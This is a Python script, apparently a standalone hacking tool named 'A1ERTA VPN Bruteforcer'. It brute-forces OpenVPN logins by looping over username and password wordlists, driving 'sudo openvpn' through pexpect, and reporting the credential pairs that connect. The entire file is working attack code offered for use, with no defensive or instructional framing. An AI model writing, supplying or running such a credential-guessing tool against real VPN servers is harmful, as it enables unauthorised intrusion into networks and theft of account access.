import argparse
import pexpect
import itertools
import os
import sys

def main():
    print("""
    =============================
       A1ERTA VPN Bruteforcer
    =============================
    """)

    parser = argparse.ArgumentParser(
        description="A1ERTA VPN Bruteforcer — Brute-force usernames and passwords for OpenVPN.",
        epilog="Example: sudo python3 brute.py -u users.txt -p passwords.txt -c config.ovpn --cont"
    )
    parser.add_argument('-u', '--users', required=True, help='Path to file with usernames')
    parser.add_argument('-p', '--passwords', required=True, help='Path to file with passwords')
    parser.add_argument('-c', '--config', required=True, help='Path to OpenVPN .ovpn config file')
    parser.add_argument('--cont', action='store_true', help='Continue brute-force even after a successful login')

    args = parser.parse_args()

    if not os.path.exists(args.users) or not os.path.exists(args.passwords) or not os.path.exists(args.config):
        print("[!] One or more input files do not exist.")
        sys.exit(1)

    with open(args.users, "r") as f:
        users = list(set(line.strip() for line in f if line.strip()))

    with open(args.passwords, "r") as f:
        passwords = list(set(line.strip() for line in f if line.strip()))

    tried = set()
    successes = []

    for username, password in itertools.product(users, passwords):
        if (username, password) in tried:
            continue
        tried.add((username, password))

        print(f"[ ] Trying {username}:{password}")

        try:
            child = pexpect.spawn(f"sudo openvpn --config {args.config}", timeout=60, encoding='utf-8')

            child.expect("Enter Auth Username:")
            child.sendline(username)

            child.expect("Enter Auth Password:")
            child.sendline(password)

            index = child.expect([
                "Initialization Sequence Completed",
                "AUTH_FAILED",
                pexpect.TIMEOUT,
                pexpect.EOF
            ])

            if index == 0:
                if (username, password) not in successes:
                    print(f"[+] SUCCESS: {username}:{password}")
                    successes.append((username, password))
                child.sendcontrol('c')
                if not args.cont:
                    break
            else:
                print("[-] Incorrect credentials or connection failed.")
                child.sendcontrol('c')

        except Exception as e:
            print(f"[!] Exception: {e}")

    if successes:
        print("\n========== VALID CREDENTIALS ==========")
        for user, pwd in successes:
            print(f"[+] {user}:{pwd}")
    else:
        print("\n[-] No valid credentials found.")

if __name__ == "__main__":
    main()
